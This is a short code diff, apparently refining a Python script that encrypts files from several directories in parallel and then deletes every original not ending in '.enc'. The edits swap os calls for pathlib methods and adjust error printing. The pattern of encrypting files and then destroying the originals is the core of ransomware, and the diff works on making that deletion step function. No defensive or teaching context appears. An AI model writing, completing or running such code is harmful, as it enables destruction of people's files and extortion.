@@ -48,15 +48,14 @@ def delete_original_files():
     files = get_files(Path.home() / "Desktop/myapp")
 
     for file in files:
-        if file.endswith(".enc"):
+        if file.suffix == ".enc":
             continue
 
-        if os.path.isfile(file):
+        if file.is_file():
             try:
-                os.remove(file)
+                file.unlink()
             except Exception as e:
-                a = 1
-                #print("error deleting:", file, e)
+                print(e)
 
 
 def main():
@@ -67,7 +66,6 @@ def main():
     for d in directories:
         all_files.extend(get_files(d))
 
-    print(all_files)
 
     with ThreadPoolExecutor(max_workers=4) as executor:
        executor.map(encrypt_file, all_files)
